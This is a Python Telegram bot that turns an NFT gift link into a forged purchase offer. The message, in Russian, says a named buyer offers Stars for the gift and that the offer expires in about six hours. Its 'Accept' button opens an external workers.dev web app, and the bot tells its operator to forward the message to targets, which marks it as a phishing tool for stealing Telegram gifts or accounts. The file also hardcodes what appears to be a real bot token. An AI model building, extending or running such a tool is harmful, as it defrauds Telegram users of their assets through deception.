import asyncio
import logging
import re
from urllib.parse import quote

from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.enums import ParseMode

BOT_TOKEN = "8731128809:AAGKkScn9upJcg5atWJxFISR7hEhAllIRfc"
WEBAPP_URL = "small-flower-5d36.grokkgrok11.workers.dev"  # замени на свой
current_buyer = "faqux"
DEFAULT_STARS = 7000

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


def parse_gift(text: str):
    m = re.search(r't\.me/nft/([A-Za-z0-9]+)-(\d+)', text)
    if not m:
        return None
    name, num = m.group(1), m.group(2)
    gift_name = re.sub(r'([a-z])([A-Z])', r'\1 \2', name)
    stars = DEFAULT_STARS
    for match in re.finditer(r'\b(\d{3,7})\b', text):
        val = int(match.group(1))
        if str(val) != num and 100 <= val <= 1000000:
            stars = val
            break
    slug = f"{name}-{num}"
    return {
        "gift_name": f"{gift_name} #{num}",
        "link": f"https://t.me/nft/{slug}",
        "stars": stars
    }


def popup_url(gift_name: str, stars: int) -> str:
    return (
        f"{WEBAPP_URL}?gift={quote(gift_name)}&stars={stars}&buyer={quote(current_buyer)}"
    )


@dp.message()
async def on_msg(message: Message):
    text = message.text or ""
    gift = parse_gift(text)
    if not gift:
        await message.answer("Кинь ссылку t.me/nft/... и цену")
        return

    offer_text = (
        f"{gift['link']}\n\n"
        f"<b>Пользователь {current_buyer} предлагает Вам {gift['stars']} Stars за подарок {gift['gift_name']}.</b>\n\n"
        f"Предложение действует ещё <b>5ч 59м</b>."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✗ Отклонить", callback_data="dec"),
        InlineKeyboardButton(
            text="✓ Принять",
            web_app=WebAppInfo(url=popup_url(gift["gift_name"], gift["stars"]))
        )
    ]])

    await message.answer("Готово. Перешли ниже.")
    await message.answer(offer_text, reply_markup=kb, parse_mode=ParseMode.HTML)


@dp.callback_query(F.data == "dec")
async def on_dec(cb: CallbackQuery):
    try:
        await cb.message.edit_text("Предложение отклонено.", reply_markup=None)
    except Exception:
        pass
    await cb.answer()


async def main():
    print("Popup bot started")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
